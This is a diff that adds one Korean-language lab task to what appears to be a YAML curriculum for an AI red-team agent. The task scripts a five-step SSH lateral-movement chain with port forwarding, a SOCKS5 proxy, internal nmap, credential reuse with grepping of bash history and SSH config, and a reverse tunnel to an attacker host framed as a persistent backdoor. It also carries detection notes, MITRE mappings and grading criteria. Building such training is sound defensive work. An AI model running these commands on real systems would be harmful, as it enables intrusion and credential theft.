@@ -1065,3 +1065,67 @@ steps:
 
     '
   script: ''
+- order: 100
+  instruction: '[Multi-task] 측면 이동 5단계 통합 — SSH -L → SSH -D → 내부 nmap → 자격 재사용 → SSH -R 역터널.'
+  bastion_prompt: |
+    Lateral Movement 5 표면을 한 흐름의 침투 chain 으로 수행해줘. {{WEB_IP}} 첫 거점 가정.
+
+    1) [SSH 로컬 포워딩] ssh -L 8888:{{SECU_IP}}:55000 ccc@{{WEB_IP}} 의 명령 작성 + 의도 (attacker localhost:8888
+       → 6v6-web → secu:55000 의 Wazuh API 접근). 방어자 시점 detection (ss -tnp 의 비정상 LISTEN, ssh
+       multiplexing log) 정리. MITRE T1090.001 매핑.
+
+    2) [SSH 동적 포워딩 (SOCKS5)] ssh -D 1080 -N -f ccc@{{WEB_IP}} + curl --socks5 localhost:1080 http://{{SECU_IP}}:55000
+       의 의사 호출. proxychains.conf 의 socks5 1080 설정도 함께 작성. MITRE T1090.002 매핑.
+
+    3) [내부 nmap] ssh ccc@{{WEB_IP}} 'nmap -sT -p 22,80,443,55000,9200 {{SECU_IP}} 10.20.32.100 10.20.30.1'
+       의 명령 + 결과 분류 (open / filtered / unreachable). 첫 거점에서 의 internal recon. 결과 표 작성.
+       MITRE T1018 매핑.
+
+    4) [자격 재사용 시도] ssh ccc@{{SECU_IP}} 의 시도 (동일 비번 ccc/1 의 재사용 가정). 응답 (auth 성공 / fail2ban)
+       + ssh 의 자격 누출 source (실제로는 ~/.bash_history, ~/.ssh/config, /etc/passwd) 의 검색 명령
+       (ssh ccc@{{WEB_IP}} 'grep -E "ssh|password" ~/.bash_history; cat ~/.ssh/config 2>/dev/null') 작성.
+       MITRE T1078.001 + T1552.004 매핑.
+
+    5) [SSH -R 역터널] ssh -R 0.0.0.0:9999:localhost:22 attacker@{{ATTACKER_IP}} 의 명령 작성 (6v6-web 의 22 를
+       attacker:9999 로 노출). 의도 (attacker → attacker:9999 → 6v6-web:22 의 perpetual 백도어). 방어자 detection
+       (ssh -R 의 GatewayPorts yes 필요, EgressFilter 의 비정상 OUT 연결, /var/log/auth.log 의 forwarded port)
+       정리. MITRE T1572 + T1090.003 매핑.
+
+    마지막에 5단계 × (Lateral 표면 / SSH 옵션 / 방향 / 의도 / 탐지 신호 / 방어 권고) 의 5×6 매트릭스 +
+    Lateral Movement Graph (ASCII art - attacker → web → secu → siem 의 화살표 path) + AAR (시간순 timeline +
+    SOC 시점 의 의심 신호 정리) 를 markdown 으로 출력. 실 perpetual ssh -R 은 시연 후 즉시 종료 (timeout).
+  hint: Lateral Movement 5 표면 chain. SSH 옵션 4종 (-L/-D/-R + 일반 ssh) + 자격 재사용. Graph 가 핵심 산출물.
+  category: multi_task
+  points: 50
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+    semantic:
+      intent: '[통합] Lateral Movement 5단계 — SSH -L/-D/-R + 내부 nmap + 자격 재사용. MITRE T1090/T1018/T1078/T1552/T1572 매핑 + 5×6 매트릭스 + Graph.'
+      success_criteria:
+      - 5 단계 모두 실행
+      - SSH -L + -D + -R 3 옵션 정확
+      - MITRE T1090 또는 T1018 또는 T1078 중 2개 이상 매핑
+      - 자격 재사용 시도 + 누출 source 검색
+      - 5×6 매트릭스
+      - Lateral Movement Graph (ASCII)
+      acceptable_methods:
+      - bastion 의 multi-stage planning
+      - ssh / proxychains / curl --socks5 / nmap 표준
+      - 실 perpetual -R 은 timeout 종료
+      - ASCII Graph 또는 graphviz dot 양식
+      negative_signs:
+      - 3 단계 이하 만 수행
+      - SSH 옵션 오류 (-L / -D / -R 혼동)
+      - 자격 재사용 누락
+      - 매트릭스 6 컬럼 미만
+      - Graph 누락
+  target_vm: attacker
+  risk_level: low
+  answer: |
+    🤖 위 bastion_prompt 그대로. Lateral 5 표면 + 5×6 매트릭스 + Graph + AAR.
+  answer_detail: |
+    Red Team Operator 페르소나 — Lateral Movement chain 5 표면. SSH 4 옵션 + 자격 재사용 의
+    표준 chain. Graph 가 SOC inform 산출물.
+  script: ''
